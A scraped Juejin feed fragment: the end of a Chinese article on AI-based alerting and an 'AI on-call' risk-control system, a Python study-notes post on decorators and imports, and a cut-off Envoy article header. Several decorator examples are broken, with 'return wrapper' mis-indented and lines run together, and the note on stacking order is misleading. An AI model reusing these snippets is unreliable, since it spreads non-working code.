<p>为此，ROS重点构建了<strong><strong>报警自主生成&amp;运维</strong></strong>与<strong><strong>报警智能降噪</strong></strong>能力来解决报警完备性和有效性问题。本文从通用逻辑阐述 AI 监控管理方案。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69c62626ddf94f5cb27253cb491d5fba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqmR2Vla-ivtA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443400&amp;x-signature=FYosmm7MV9mE24MjwitwuSiQUjs%3D" alt="图片" loading="lazy"/></p>
<p>为达到完备和有效的目标，需重点解决以下四大问题：</p>
<p><strong><strong>（1）如何做到完备的覆盖</strong></strong>：构建完备的系统与业务知识，抽象所有监控对象并构建不同监控对象关系，结合监控基础知识与大模型，生成完善的监控覆盖方案，其中需要重点关注业务监控基础知识差异，同时使用影响范围、对象分层等作为输入进行方案构建。</p>
<p><strong><strong>（2）如何做到监控项智能生成</strong></strong>：依据监控对象、关系、基础知识、数据 / 业务特征及经验，生成含监控对象、策略、关联参数、通知方式等的多维度复杂监控项参数，这里结合时序模型、大模型来综合判断，最终结合监控平台能力完成监控项的生成；监控生成分为完全自主生成（适用于场景明确、准确度高的场景）与协同式生成（需人工确认，用于初始阶段或准确度不足时），两种方式适合于不同成熟度的场景使用。</p>
<p><strong><strong>（3）如何做到异常智能识别</strong></strong>：通过规则、时序模型、大模型、动态阈值等机制，判断数据或用例结果是否为问题，不同的监控平台、监控对象、数据特征、业务特征适合不同类型的异常检测策略。</p>
<p><strong><strong>（4）如何进行智能降噪</strong></strong>：分析单个报警 、关联报警、多个报警的异常特征、关系及盯盘情况来综合判断是否需要进行报警通知，并结合风险程度、影响范围、时效性等解决无效打扰、报警淹没等问题，平衡质效。</p>
<p>下面是典型的业务&amp;监控平台提供的能力示例如下，通过上述关键问题的解决，结合底层完备/准确的知识构建和场景化的应用产品，监控召回率保持90%+，报警生成比例78%，部分业务监控降噪比例已达到60%。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32b5ebfbf3c44e6386e042d39a40dd30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqmR2Vla-ivtA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443400&amp;x-signature=y%2BpqE52K8m3k00NFKusN8B%2BdsK8%3D" alt="image.png" loading="lazy"/></p>
<p>报警生成示例</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ca7dfd25b9f403d84c05603a6d667fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqmR2Vla-ivtA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443400&amp;x-signature=Jnu5FI5hD9PfGN7fouqj7Me6VRc%3D" alt="image.png" loading="lazy"/></p>
<p>切流导致的报警降噪（绿色点不通知）示例</p>
<h3 data-id="heading-6"><strong>3.3 RCS  Agent（AI值班人）</strong></h3>
<p>风险控制系统主要解决报警后跟进及时性、排查准确性与效率问题，通过快速找到有效止损线索并止损缩小影响，将问题损失控制在最小范围，会面临以下几个关键问题：</p>
<p><strong><strong>（1）匹配最优跟进人 / 方案</strong></strong>：如何结合问题影响面、跟进代价与时效性，明确 AI 或真人跟进的成本与效果。</p>
<p><strong><strong>（2）提供排查线索与止损预案</strong></strong>：如何依据业务经验、变更信息、系统知识、历史故障等，匹配最契合排查链路/工具找到正确的线索并从预案库筛选最优止损方案，实现快速止损。</p>
<p><strong><strong>（3）解决跟进过程信息与人员混乱</strong></strong>：针对多角色、多团队参与的线上处置场景，尤其长链路业务信息差问题，需要构建端到端事件管理机制，确保及时找对负责人、同步信息，减少干扰与维护成本。</p>
<p>为了解决上述问题，构建了一套统一的RCS建设方案，可实现基于AI的全方位风险控制能力。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1072ba0715a4dd991e695f16d70a1cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqmR2Vla-ivtA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443400&amp;x-signature=zYbRUb4VtdeyKHjAjVD%2FsA0ofiM%3D" alt="图片" loading="lazy"/></p>
<p>方案中有几个关键部分，展开介绍如下：</p>
<p><strong><strong>（1）问题导诊</strong></strong>：报警后快速明确风险影响面、跟进方（AI or 真人），提供智能排查结论，按业务特点构建导诊策略（如影响面、风险对象、业务类别等），实现差异化问题处置通路。</p>
<p><strong><strong>（2）端到端事件管理</strong></strong>：搭建事件管理产品，覆盖事件感知、建群、排查、止损、总结、跟踪全生命周期，提供流程管理、信息互通等核心能力，同时完成事件信息的统一中心化存储，实现 MEG 线上事件标准化管理。</p>
<p><strong><strong>（3）AI值班人自主处置（常见于慢损问题）</strong></strong>：对影响小、暂无需真人介入的问题，AI 通过定位工具调度、对话分析、人员地图等能力，完成初步分析、变更确认、标注等工作，确认是线上问题后再转真人跟进。自主处置AI值班人的目标是自主完成问题处置，所以需要建设完善的定位工具调度、单对单对话、自然语言分析、人员地图能力，并能够实现拟人化的信息确认和自主分析。</p>
<p><strong><strong>（4）AI值班人引导处置（常见于快损问题）</strong></strong>：快损问题需真人与 AI 协同，AI 以助手身份提供线索推荐、工具推荐、止损操作推荐、事件盯盘等支持，且可动态调整策略（如根据损失预估切换止损方式），触达正确人员快速判断，快损事件的关键目标是快速止损，所以无论是触达效率、有损止损动作选择权衡等均需要以综合损失最小快速止损为目标。</p>
<p><strong><strong>（5）高危事件管控中心</strong></strong>：针对业务与系统关联复杂的情况，构建全局管控中心与 MEG 高危事件 AI 值班人，与各业务 AI 值班人协同，实现事件信息、工具、线索互通，避免因信息差延误止损。</p>
<p>通过持续的能力建设和数字化构建，线上问题的智能定位覆盖率和准确率稳步增长，同时为了解决问题损失（等级）和MTTR的耦合关系，构建了基于损失速度分桶的损失控制达标率指标，该达标率同样持续提升至93%。AI值班人开始持续在风险控制过程中发挥作用，AI值班人协助率达到96%，端到端协率完成协助率达到40%。</p>
<h2 data-id="heading-7">04 总结&amp;展望</h2>
<p>随着RMCS能力的建设，质量结果得到了非常有效的控制（如下图）。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51fd28c6ed9e4ed7a4d22213ee70b132~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqmR2Vla-ivtA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443400&amp;x-signature=7d395bp9HKaMldCkNJSBhXT7KTk%3D" alt="图片" loading="lazy"/></p>
<p>（1）从线上问题数量上看，线上问题总数逐年降低，25年对比22年降低比例超过53%，说明我们具备了将问题前置拦截通过风险呼唤前置解决的能力。</p>
<p>（2）从线上问题等级上看，严重问题数量也在持续降低，说明我们具备了快速问题感知和控制的能力，将高损问题转化为低损问题。</p>
<h3 data-id="heading-8"><strong><strong>展望</strong></strong></h3>
<p>目前质量风险管控已经发展了AI转型的重要时期，已经从使用AI解决工具问题变化为使用面向AI构建知识、产品，AI从辅助人慢慢的开始在更多场景可以替代人，因人的投入限制质量保障工作的限制会逐步被突破，质量风险管控后续也可能会变成人和AI更深度协同分析的局面，AI发挥自我学习、24h oncall、智能化的特长完成绝大部份的风险管控，正式员工发挥知识构建、训练AI并构建符合AI的管控产品，最终协同构建更智能化的风险管控目标。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python学习笔记3]]></title>    <link>https://juejin.cn/post/7579716343453958187</link>    <guid>https://juejin.cn/post/7579716343453958187</guid>    <pubDate>2025-12-04T09:02:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579716343453958187" data-draft-id="7578734725301436468" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python学习笔记3"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-04T09:02:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="李剑一"/> <meta itemprop="url" content="https://juejin.cn/user/4147782344247918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python学习笔记3
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4147782344247918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    李剑一
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:02:18.000Z" title="Thu Dec 04 2025 09:02:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">装饰器</h2>
<h4 data-id="heading-1">函数装饰器</h4>
<p>装饰器就是在不改动原有函数的前提下，动态修改函数的功能，然后返回一个新函数。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_decorator</span>(<span class="hljs-params">func</span>): 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(): 
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"在原函数之前执行"</span>) 
        func() 
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"在原函数之后执行"</span>) 
        <span class="hljs-keyword">return</span> wrapper 

<span class="hljs-meta">@my_decorator </span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">say_hello</span>(): 
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Hello!"</span>) 
    
say_hello() <span class="hljs-comment"># 在原函数之前执行 # Hello! # 在原函数之后执行</span>
</code></pre>
<p>装饰器函数也可以接收到原函数的参数：</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_decorator</span>(<span class="hljs-params">func</span>): 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>): 
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"在原函数之前执行, <span class="hljs-subst">{args}</span>"</span>) 
        func(*args, **kwargs) 
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"在原函数之后执行, <span class="hljs-subst">{args}</span>"</span>) 
        <span class="hljs-keyword">return</span> wrapper 
        
<span class="hljs-meta">@my_decorator </span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>): 
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Hello, <span class="hljs-subst">{name}</span>!"</span>) greet(<span class="hljs-string">"Alice"</span>) 
    
<span class="hljs-comment"># 在原函数之前执行, ('Alice',) # Hello, Alice! # 在原函数之后执行, ('Alice',)</span>
</code></pre>
<p><strong>注意</strong>：装饰器不是继承！装饰器是在不改变原始函数的前提下，通过对原始函数的包装来扩展它的功能。而继承是子类在扩展父类。</p>
<h4 data-id="heading-2">类装饰器</h4>
<p>类装饰器的效果和函数装饰器大致相同，接收一个类作为参数，返回一个修改过的新类。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">log_class</span>(<span class="hljs-params">cls</span>): 
<span class="hljs-string">"""类装饰器，在调用方法前后打印日志"""</span> 
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Wrapper</span>: 
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args, **kwargs</span>): 
            self.wrapped = cls(*args, **kwargs) 
            <span class="hljs-comment"># 实例化原始类 </span>
            <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, name</span>): 
                <span class="hljs-string">"""拦截未定义的属性访问，转发给原始类"""</span> 
                <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(self.wrapped, name) 
                
            <span class="hljs-keyword">def</span> <span class="hljs-title function_">display</span>(<span class="hljs-params">self</span>): 
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"调用 <span class="hljs-subst">{cls.__name__}</span>.display() 前"</span>) 
                self.wrapped.display() 
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"调用 <span class="hljs-subst">{cls.__name__}</span>.display() 后"</span>) 
                <span class="hljs-keyword">return</span> Wrapper 
                <span class="hljs-comment"># 返回包装后的类 </span>
                
<span class="hljs-meta">@log_class </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>: 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">display</span>(<span class="hljs-params">self</span>): 
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"这是 MyClass 的 display 方法"</span>) 
        obj = MyClass() 
        obj.display() 
        
<span class="hljs-comment"># 调用 MyClass.display() 前 </span>
<span class="hljs-comment"># 这是 MyClass 的 display 方法 </span>
<span class="hljs-comment"># 调用 MyClass.display() 后</span>
</code></pre>
<h4 data-id="heading-3">内置装饰器</h4>
<ol>
<li>@staticmethod: 将方法定义为静态方法，不需要实例化类即可调用。</li>
<li>@classmethod: 将方法定义为类方法，第一个参数是类本身（通常命名为 cls）。</li>
<li>@property: 将方法转换为属性，使其可以像属性一样访问。</li>
</ol>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>: 
<span class="hljs-meta">    @staticmethod </span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">static_method</span>(): 
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"这是一个静态方法！"</span>) 
        
<span class="hljs-meta">    @classmethod </span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">class_method</span>(<span class="hljs-params">cls</span>): 
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"这是一个类方法 <span class="hljs-subst">{cls.__name__}</span>."</span>) 
        
<span class="hljs-meta">    @property </span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>): 
        <span class="hljs-keyword">return</span> self._name 
            
<span class="hljs-meta">    @name.setter </span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self, value</span>): 
        self._name = value 
            
<span class="hljs-comment"># 使用 </span>
MyClass.static_method() 
MyClass.class_method() 
obj = MyClass() 
obj.name = <span class="hljs-string">"Alice"</span> 
<span class="hljs-built_in">print</span>(obj.name)
</code></pre>
<h4 data-id="heading-4">多个装饰器堆叠</h4>
<p>装饰器可以通过堆叠的方式对函数进行无限扩展，多个装饰器存在的时候会按照从上到下的顺序依次应用。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator1</span>(<span class="hljs-params">func</span>): 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(): 
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Decorator 1"</span>) 
        func() 
        <span class="hljs-keyword">return</span> wrapper 
        
<span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator2</span>(<span class="hljs-params">func</span>): 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(): 
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Decorator 2"</span>) 
        func() 
        <span class="hljs-keyword">return</span> wrapper 
        
<span class="hljs-meta">@decorator1 </span>
<span class="hljs-meta">@decorator2 </span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">say_hello</span>(): 
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Hello!"</span>) 
    
say_hello()
</code></pre>
<h2 data-id="heading-5">引用</h2>
<p>Python使用 import 关键字对其他 py 模块进行引用。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">import</span> supper supper.test(<span class="hljs-string">'123'</span>)
</code></pre>
<p><strong>注意</strong>：在Python中无论文件声明了多少次 import ，只要是相同的文件，则当前文件只会被导入一次！</p>
<p>Python 导入文件的查找路径为：<code>当前脚本目录 → PYTHONPATH → 标准库 → 第三方包（site-packages）</code></p>
<p>这种导入方案带来的一个问题是<strong>项目中不能存在相同名称的模块，否则会存在冲突</strong>！</p>
<p>所以<strong>永远不要给模块/代码库起相同的名字</strong>。</p>
<h4 data-id="heading-6">部分引用</h4>
<p>Python 支持部分导入的模式，使用 <code>form...import</code> 的形式。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">from</span> fibo <span class="hljs-keyword">import</span> fib, fib2 fib(<span class="hljs-number">500</span>) <span class="hljs-comment"># 1 1 2 3 5 8 13 21 34 55 89 144 233 377</span>
</code></pre>
<p>还可以通过使用 <code>as</code> 关键字对导入的函数重命名。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np <span class="hljs-comment"># 将 numpy 模块别名设置为 np from math import sqrt as square_root # 将 sqrt 函数别名设置为 square_root</span>
</code></pre>
<h4 data-id="heading-7">全量引用</h4>
<p>可以使用 <code>*</code> 字符将所有的函数导入进来。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">from</span> modname <span class="hljs-keyword">import</span> *
</code></pre>
<p>注意：不建议使用此方式，可能会导致命名冲突。</p>
<h4 data-id="heading-8"><code>__name__</code> 属性</h4>
<p>使用引入的方式开发某些功能时，我们可能希望在原始函数中执行某个功能，在引入的代码中屏蔽这个功能。</p>
<p>可以使用 <code>__name__</code> 属性，当在原始函数中执行的时候 <code>__name__ == '__main__'</code>。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>: 
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'程序自身在运行'</span>) 
<span class="hljs-keyword">else</span>: 
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'我来自另一模块'</span>)
</code></pre>
<p><strong>注意</strong>：<code>__name__</code> 属性始终存在，在原始函数中叫 <code>__main__</code>，在引入函数中为模块名。</p>
<h4 data-id="heading-9">dir方法</h4>
<p>Python 存在一个内置方法 <code>dir()</code> ，可以获取到模块内定义的所有名称。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">import</span> fibo, sys 
<span class="hljs-built_in">dir</span>(fibo) 
<span class="hljs-comment"># ['__name__', 'fib', 'fib2'] </span>

<span class="hljs-built_in">dir</span>(sys) 
<span class="hljs-string">""" 
['__displayhook__', '__doc__', '__excepthook__', '__loader__', '__name__', '__package__', '__stderr__', '__stdin__', '__stdout__', '_clear_type_cache', '_current_frames', '_debugmallocstats', '_getframe', '_home', '_mercurial', '_xoptions', 'abiflags', 'api_version', 'argv', 'base_exec_prefix', 'base_prefix', 'builtin_module_names', 'byteorder', 'call_tracing', 'callstats', 'copyright', 'displayhook', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'getcheckinterval', 'getdefaultencoding', 'getdlopenflags', 'getfilesystemencoding', 'getobjects', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettotalrefcount', 'gettrace', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'prefix', 'ps1', 'setcheckinterval', 'setdlopenflags', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdout', 'thread_info', 'version', 'version_info', 'warnoptions'] 
"""</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Envoy方案实现分析报告]]></title>    <link>https://juejin.cn/post/7579699192698028051</link>    <guid>https://juejin.cn/post/7579699192698028051</guid>    <pubDate>2025-12-04T08:55:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579699192698028051" data-draft-id="7579702046955208747" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Envoy方案实现分析报告"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-04T08:55:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鲁肃ls"/> <meta itemprop="url" content="https://juejin.cn/user/2268999473182269"/></div> <div itemprop="publisher" itemscope="itemscope" 